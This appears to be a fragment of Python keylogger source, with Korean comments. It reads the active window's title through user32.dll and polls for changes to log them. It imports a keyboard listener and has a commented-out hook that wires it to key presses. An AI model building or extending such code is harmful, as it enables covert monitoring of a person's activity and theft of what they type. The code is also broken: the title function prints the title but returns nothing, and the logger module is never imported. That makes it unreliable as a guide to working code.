import ctypes
import time
from pynput.keyboard import Key, Listener


#타이틀 감지 함수
def gettitle():
    lib = ctypes.windll.LoadLibrary('user32.dll')
    handle = lib.GetForegroundWindow()
    buffer = ctypes.create_unicode_buffer(255)
    lib.GetWindowTextW(handle, buffer, ctypes.sizeof(buffer))

    print(buffer.value)



def wintitle():
    oldtitle = gettitle()
    while True:
        time.sleep(0.15)
        if gettitle() != oldtitle:
            filemanager.logger("\n" + gettitle() + "\n")
        oldtitle = gettitle()



#with Listener(on_press=gettitle) as listenser:
#    listenser.join()
